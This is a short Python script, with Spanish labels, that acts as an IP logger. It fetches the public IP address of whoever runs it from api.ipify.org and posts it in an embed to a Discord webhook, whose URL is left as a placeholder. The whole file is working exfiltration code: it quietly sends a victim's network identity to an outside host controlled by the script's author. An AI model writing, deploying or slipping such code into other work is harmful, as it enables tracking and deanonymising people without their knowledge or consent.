import socket
import requests
import discord_webhook
from discord_webhook import DiscordWebhook, DiscordEmbed
ip = 'https://api.ipify.org/' 
output = requests.get(ip).text
webhook = DiscordWebhook(url='Weebhook_URL')
embed = DiscordEmbed(title='Nueva IP logeada:', description=output, color=0000)
embed.set_author(name='Logger', url='https://freskys.weebly.com/', icon_url='https://cdn.discordapp.com/avatars/607700887858708664/55b0185463cc054f8b2f11f4aec35444.png?size=512')
embed.set_footer(text='Hecho por αℓχ3яᶠᵈ#0429')
embed.set_timestamp()
webhook.add_embed(embed)
response = webhook.execute()